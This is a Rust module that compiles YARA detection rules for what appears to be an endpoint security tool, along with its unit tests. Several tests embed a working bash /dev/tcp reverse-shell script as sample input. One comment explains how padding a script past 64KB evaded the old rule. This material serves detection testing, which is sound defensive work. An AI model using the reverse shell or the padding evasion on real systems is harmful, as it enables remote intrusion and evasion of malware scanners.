use std::path::Path;

use anyhow::{Context, Result};
use tracing::{info, warn};

const BUILTIN_RULES: &str = include_str!("../rules/builtin.yar");

/// Compiles the built-in rule set plus any `*.yar` files found in
/// `custom_rules_dir` (if given and it exists).
///
/// `yara_x::Compiler::add_source` only ever *borrows* its input
/// (`SourceCode` has no owning `From<String>` impl, confirmed by testing:
/// passing an owned `String` fails to compile at all, not just at
/// runtime) - so every custom rule file's content is read into `contents`
/// up front and kept alive for the compiler's entire lifetime, rather than
/// read-and-added one file at a time inside the loop, which would try to
/// register a reference into a `String` about to be dropped at the end of
/// that same iteration.
pub fn compile(custom_rules_dir: Option<&Path>) -> Result<yara_x::Rules> {
    let mut contents: Vec<String> = Vec::new();
    if let Some(dir) = custom_rules_dir {
        if dir.is_dir() {
            // Not `?`: a review found that an unreadable (not merely
            // absent) custom rules directory - wrong permissions, an
            // ACL denying this process, a mount gone stale - made this
            // `Context`-wrapped error propagate all the way out of
            // `compile`, which both the live monitor's startup and every
            // on-demand `StartScan` call this same function to build
            // their rule set. That took down the *entire* YARA module,
            // built-in rules included, over a directory this feature
            // never required to exist or be readable in the first place
            // (`custom_rules_dir` is opt-in extra rules, not something
            // the built-in set depends on). Degrading to builtin-only
            // instead - logged loudly, but not fatal - matches how a
            // missing directory is already handled just below.
            match std::fs::read_dir(dir) {
                Ok(entries) => {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        if path.extension().and_then(|e| e.to_str()) != Some("yar") {
                            continue;
                        }
                        match std::fs::read_to_string(&path) {
                            Ok(src) => contents.push(src),
                            Err(e) => warn!(path = %path.display(), error = %e, "failed to read custom YARA rule file, skipping"),
                        }
                    }
                }
                Err(e) => warn!(dir = %dir.display(), error = %e, "custom YARA rules dir exists but could not be read, falling back to built-in rules only"),
            }
        } else {
            warn!(dir = %dir.display(), "custom YARA rules dir does not exist, skipping");
        }
    }

    let mut compiler = yara_x::Compiler::new();
    compiler.add_source(BUILTIN_RULES).context("compiling built-in YARA rules")?;

    let mut custom_loaded = 0usize;
    for src in &contents {
        match compiler.add_source(src.as_str()) {
            Ok(_) => custom_loaded += 1,
            Err(e) => warn!(error = %e, "failed to compile a custom YARA rule file, skipping it"),
        }
    }

    info!(custom_loaded, "YARA rules compiled");
    Ok(compiler.build())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn matched_rule_names(rules: &yara_x::Rules, content: &[u8]) -> Vec<String> {
        let mut scanner = yara_x::Scanner::new(rules);
        let results = scanner.scan(content).expect("scan should not fail on in-memory content");
        results.matching_rules().map(|r| r.identifier().to_string()).collect()
    }

    #[test]
    fn flags_a_genuine_bash_dev_tcp_reverse_shell_script() {
        let rules = compile(None).unwrap();
        let script = b"#!/bin/bash\nexec 3<>/dev/tcp/10.0.0.1/4444\ncat <&3 | while read line; do $line 2>&3 >&3; done\n";
        assert!(matched_rule_names(&rules, script).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()));
    }

    /// Regression test for a real false positive found in live red-team
    /// testing: a genuine, unmodified `/bin/bash` binary contains the
    /// bare strings "/dev/tcp/" (its own redirection feature) and
    /// "exec " somewhere in its compiled strings table, which the
    /// original, looser version of this rule (`$tcp or $udp) and $exec`
    /// with no redirection-syntax or size requirement) matched outright -
    /// quarantining a stock system binary as a "reverse shell". This
    /// synthesizes the same shape (the two trigger substrings present,
    /// but never as actual shell redirection syntax, padded past the
    /// rule's size cutoff) without needing an actual bash binary on the
    /// test machine.
    #[test]
    fn does_not_flag_a_large_binary_that_merely_contains_the_bare_substrings() {
        let rules = compile(None).unwrap();
        let mut fake_binary = vec![0x7Fu8, b'E', b'L', b'F'];
        fake_binary.extend_from_slice(b"...references /dev/tcp/ in its own help text, and separately documents the exec builtin...");
        fake_binary.resize(70 * 1024, 0xAA);
        assert!(!matched_rule_names(&rules, &fake_binary).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()));
    }

    /// Regression test for a real bypass found in a follow-up review: the
    /// original rule gated the whole file on `filesize < 65536`, so an
    /// attacker could leave a genuine, working reverse-shell payload right
    /// at the top of the script and just pad the file past 64KB with
    /// trailing junk to make YARA skip scanning it entirely. The fix
    /// bounds where the matched strings must occur (still within the
    /// first 64KB) instead of exempting the whole file past a size
    /// threshold, so this padded-but-still-malicious script must still
    /// be flagged.
    #[test]
    fn still_flags_a_genuine_reverse_shell_padded_past_the_old_filesize_cutoff() {
        let rules = compile(None).unwrap();
        let mut script = b"#!/bin/bash\nexec 3<>/dev/tcp/10.0.0.1/4444\ncat <&3 | while read line; do $line 2>&3 >&3; done\n# ".to_vec();
        script.resize(70 * 1024, b'A');
        assert!(matched_rule_names(&rules, &script).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()));
    }

    #[test]
    fn nonexistent_custom_rules_dir_falls_back_to_builtin_only() {
        let dir = std::env::temp_dir().join(format!("warden-yara-rules-test-missing-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let rules = compile(Some(&dir)).expect("a missing custom rules dir must not make compile() fail");
        let script = b"#!/bin/bash\nexec 3<>/dev/tcp/10.0.0.1/4444\ncat <&3 | while read line; do $line 2>&3 >&3; done\n";
        assert!(matched_rule_names(&rules, script).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()), "builtin rules must still load");
    }

    #[test]
    fn a_valid_custom_rule_file_loads_alongside_builtins() {
        let dir = std::env::temp_dir().join(format!("warden-yara-rules-test-custom-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("custom.yar"),
            "rule Custom_Canary { strings: $a = \"warden-custom-rule-canary\" condition: $a }",
        )
        .unwrap();
        // A non-.yar file in the same directory must be ignored, not
        // cause an error.
        std::fs::write(dir.join("README.txt"), "not a rule file").unwrap();

        let rules = compile(Some(&dir)).expect("a readable custom rules dir with a valid rule must compile");
        assert!(matched_rule_names(&rules, b"warden-custom-rule-canary").contains(&"Custom_Canary".to_string()), "the custom rule must be loaded");
        // Builtins must still be present alongside it.
        let script = b"#!/bin/bash\nexec 3<>/dev/tcp/10.0.0.1/4444\ncat <&3 | while read line; do $line 2>&3 >&3; done\n";
        assert!(matched_rule_names(&rules, script).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()), "builtin rules must still load alongside custom ones");

        std::fs::remove_dir_all(&dir).ok();
    }
}
